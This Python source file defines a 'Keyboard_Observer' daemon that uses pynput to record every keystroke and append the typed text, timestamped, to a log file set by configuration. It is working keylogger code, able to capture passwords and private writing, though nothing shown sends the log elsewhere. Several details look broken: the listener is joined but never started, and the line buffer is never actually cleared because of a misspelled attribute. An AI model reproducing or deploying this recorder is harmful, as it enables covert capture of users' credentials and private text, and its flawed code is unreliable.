import threading
from datetime import datetime, timezone
from pynput.keyboard import Key, KeyCode, Listener

from src.domain.system_daemon import System_Daemon
from src.domain.config import Config
from src.applications.common.logger_handler import Logger


class Keyboard_Observer(System_Daemon):
    def __init__(self, config: Config, logger: Logger, idle_time_limit: float):
        self.__is_running: bool = False
        self.__logger: Logger = logger
        self.__idle_time_limit = idle_time_limit  # inactivity time for new line
        self.__current_line: list[str] = []
        self.__last_key_time = datetime.now(timezone.utc)
        self.__timer = None
        self.__listener: Listener | None = None
        _file_path = config["FILE_PATH"]
        _extend = config["EXTEND"]
        _information = config["KEYS_INFORMATION"]
        self.__path: str = _file_path + _extend + _information
        self.__logger.info("ready")

    def start(self) -> None:
        if self.__is_running:
            return None
        self.__logger.info("starting")
        self.__listener = Listener(on_press=self.__on_press)
        self.__listener.join()
        self.__is_running = True

    def stop(self) -> None:
        if not self.__is_running:
            self.__logger.info("daemon is not running")
            return None
        self.__logger.info("stopping")
        if self.__listener is not None:
            self.__listener.stop()
            self.__listener = None
        self.__is_running = False

    def restart(self) -> None:
        if not self.__is_running:
            self.__logger.info("daemon is not running")
            return None
        self.__logger.info("restarting")
        self.stop()
        self.start()

    def __on_press(self, key: Key | KeyCode | None) -> None:
        self.__logger.debug("key: ", key)
        self.__last_key_time = datetime.now(timezone.utc)
        if key is None:
            return
        # Teclas alfanuméricas y ESPACIO (tratado como carácter normal)
        if isinstance(key, KeyCode) and key.char is not None:
            self.__current_line.append(key.char)
            self.__reset_timer()
        # Teclas especiales (ENTER = salto de línea, TAB = tabulación)
        elif isinstance(key, Key):
            if key == Key.space:  # El espacio ahora es un carácter normal
                self.__current_line.append(" ")
                self.__reset_timer()
            elif key == Key.enter:
                self.__current_line.append("\n")
                self.__write_to_log()
            elif key == Key.tab:
                self.__current_line.append("\t")
                self.__reset_timer()
            elif key == Key.esc:
                self.__write_to_log(force_newline=True)

    def __write_to_log(self, force_newline: bool = False):
        self.__logger.info(f"writing in {self.__path}")
        if not self.__current_line and not force_newline:
            return  # No hace nada si no hay contenido y no se fuerza
        with open(self.__path, "a", encoding="utf-8") as _f:
            _utc_time = (
                self.__last_key_time.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3] + " UTC"
            )
            _line_content = (
                "".join(self.__current_line) if self.__current_line else "[special key]"
            )
            _f.write(f"[{_utc_time}] {_line_content}\n")
        self._current_line = []
        if self.__timer is not None:
            self.__timer.cancel()
            self.__timer = None

    def __reset_timer(self) -> None:
        if self.__timer is not None:
            self.__timer.cancel()
        _timer = threading.Timer(self.__idle_time_limit, self.__write_to_log)
        _timer.start()
        return
